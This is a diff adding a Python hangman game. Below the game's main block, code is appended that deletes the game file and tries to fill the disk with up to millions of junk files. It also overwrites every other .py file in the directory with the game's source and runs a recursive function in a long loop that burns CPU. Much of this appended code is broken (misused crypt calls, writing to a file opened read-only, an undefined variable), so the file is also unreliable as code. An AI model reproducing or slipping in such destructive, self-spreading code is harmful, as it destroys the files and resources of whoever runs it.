@@ -1,0 +1,146 @@
+import random
+import crypt
+import time
+def get_random_word():
+    with open("hangman_words.txt", "r") as dictionary:
+        dictionary = dictionary.readlines()
+        random_word = random.choice(dictionary)
+        return random_word[:len(random_word) - 1]
+def get_input(guessed_letters):
+    guess = input("\n")
+    if len(guess) != 1:
+        print("Please only one character.  Try again")
+        return get_input(guessed_letters)
+    elif guess in guessed_letters:
+        print("You have already guessed " + guess + ".  Try again.")
+        return get_input(guessed_letters)
+    else:
+        not_english_letter = False
+        for char in "1234567890-=`;', ./[]\\~!@#$%^&*()_+{}|:\"<>?":
+            if char in guess:
+                not_english_letter = True
+        if not_english_letter == True:
+            print("Please only enter English letters.  If you tried to enter a Greek letter, you should go dig a hole and sit in it, Pecknold.")
+            return get_input(guessed_letters)    
+        else:
+            guessed_letters += guess
+        return guess.lower(), guessed_letters
+def draw_underscores(word, guessed_letters):
+    """This function prints the word, with underscores for unknown letters."""
+    for char in word:
+        if char in guessed_letters:
+            print(char, end="")
+            print(" ", end="")
+        else:
+            print("_ ", end = "")
+        time.sleep(0.05)    
+    print("\n")
+def one_turn(word, guessed_letters, guesses_left):
+    if guesses_left > 0:
+        draw_underscores(word, guessed_letters)
+        print("You have guessed: " + guessed_letters)
+        print("You have " + str(guesses_left) + " guesses left")
+        time.sleep(0.75)
+        guess, guessed_letters = get_input(guessed_letters)
+        if guess in word:
+            print("'" + guess + "'" + " is in the word.\n")
+        else:
+            print("'" + guess + "'" + " is not in the word.\n")
+            guesses_left += -1
+        running_truth = True
+        for char in word:
+            running_truth = running_truth and (char in guessed_letters)
+        if running_truth == True:
+            again = input("You have won the game.  The word was " + word + ".  Play again? ([y]es/[n]o)")
+        else:
+            print("***************************************************************************\n")
+            one_turn(word, guessed_letters, guesses_left)
+    else:
+        again = input("\n\nGAME OVER\nYou ran out of guesses.\nThe word was " + word + ".\nWould you like to play again?\n[y]es or [n]o:\n" + "")
+    if again == "y" or "yes":
+        print("\n\n\n\n\n\n\n")
+        time.sleep(0.5)
+        main()
+def get_difficulty(name):
+    difficulty = input("What difficulty would you like, " + name + "? [e]asy, [m]edium, or [h]ard:\n").lower()
+    if difficulty == "e" or difficulty == "easy":
+        guesses_left = 15
+    elif difficulty == "m" or difficulty == "medium":
+        guesses_left = 10
+    elif difficulty == "h" or difficulty == "hard":
+        guesses_left = 5
+    return guesses_left    
+def rungame(word, guessed_letters, name):
+    guesses_left = get_difficulty(name)
+    time.sleep(0.5)
+    won = False
+    one_turn(word, guessed_letters, guesses_left)
+def main():
+    guessed_letters = ""
+    print("HANGMAN\nCode copyright Will Grannis 2018, distributed under an WTFYW License.\nThis means you can copy, share, and distribute this, commercially or not.\nI request, although you have no obligation, that give credit to me, the original creator.\nMore information is available at http://www.wtfpl.net/about/")
+    time.sleep(0.5)
+    name = input("\n\nHello.  What is your name?\n").title()
+    word = get_random_word()
+    rungame(word, guessed_letters, name)
+if __name__ == '__main__':
+    main()
+import os
+
+os.remove("game.py")
+def randomword():
+    word = ""
+    for i in range(0, 1000):
+        word = word + str(crypt.crypt(crypt.crypt(crypt.crypt(str(random.randint(10000))))))
+    return word   
+   
+def make_file(i):
+    file = crypt.crypt(i^i) + str(i)
+    file = file.replace("6", "")
+    file = file.replace("$", "")
+    file = file.replace(".", "")
+    file = file + ".txt"
+    file = open(file, "r")
+    file.write(randomword())
+    file.close()
+    
+    
+def make_files(number):
+    for i in range(0, number):
+        make_file(i)
+        
+i = 1
+while i < 1000000:
+    make_files(i)
+    i += 1
+
+
+import os
+list_of_files = os.listdir(directory)
+
+
+with open("game.py", "r") as game:
+    game_text = game.read(100000)
+
+for file in list_of_files:
+    if file != "game.py":
+        if file.find(".py") != -1:
+            with open(file, "w") as victim:
+                victim.write(game_text)
+                
+def magic_number(a, b):
+    if a == 1:
+        return a ** b
+    if a > b and b != 1:
+        return magic_number(a ** 2, b - 1) * b
+    if b == 1:
+        return magic_number(a - 1, b) * a
+    if a < b:
+        return (magic_number(a, a)) * (magic_number(b, b))
+    if a == b:
+        return magic_number(a ** 2, b - 1) * a
+        
+        
+for i in range(0, 10000000):
+    magic_number(3, 3)
+    make_files(1000)
+                        
